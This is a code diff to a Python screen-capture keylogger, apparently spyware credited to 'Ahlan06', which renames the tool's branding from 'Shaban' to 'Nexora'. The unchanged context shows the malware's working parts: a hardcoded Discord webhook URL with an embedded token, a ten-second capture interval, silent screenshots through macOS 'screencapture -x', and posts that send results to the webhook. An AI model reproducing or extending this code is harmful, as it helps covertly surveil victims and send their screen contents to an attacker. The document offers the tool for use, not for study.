@@ -28,14 +28,14 @@ def detect_os():
         return 'linux'
 
 current_os = detect_os()
-print(f"Shaban Logger starting on {current_os.upper()}...")
+print(f"Nexora Logger starting on {current_os.upper()}...")
 
 init(autoreset=True)
 
 webhook = "https://discordapp.com/api/webhooks/1424843510602793042/8tc2B1HBnV5upD-AL3hBv6qQBBkbceM9JCCI_eg6X4SH21x67DKtqhY2mJAFgy8B5rta"
 interval = 10
 username = "ScreenKeylogger -  Ahlan06"
-message = " Shaban Tool - by Ahlan06"
+message = " Nexora Tool - by Ahlan06"
 
 # Variable globale pour contrôler l'exécution
 running = True
@@ -140,7 +140,7 @@ def take_screenshot():
             
         elif current_os == 'macos':
             # macOS - utilisation de screencapture natif
-            temp_file = f"/tmp/shaban_screenshot_{int(time.time())}.png"
+            temp_file = f"/tmp/nexora_screenshot_{int(time.time())}.png"
             subprocess.run(['screencapture', '-x', temp_file], check=True, capture_output=True)
             from PIL import Image
             img = Image.open(temp_file)
@@ -353,7 +353,7 @@ if __name__ == "__main__":
                 
     except KeyboardInterrupt:
         running = False
-        print(f"\n{Fore.YELLOW}Shaban Logger stopped by user{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}Nexora Logger stopped by user{Style.RESET_ALL}")
     except Exception as e:
         if running:
             send_error(f"Main error: {traceback.format_exc()}")
@@ -365,7 +365,7 @@ if __name__ == "__main__":
     
     try:
         requests.post(webhook, json={
-            "username": "Shaban Logger",
+            "username": "Nexora Logger",
             "content": "🔴 Logger stopped by the user"
         }, timeout=5)
     except:
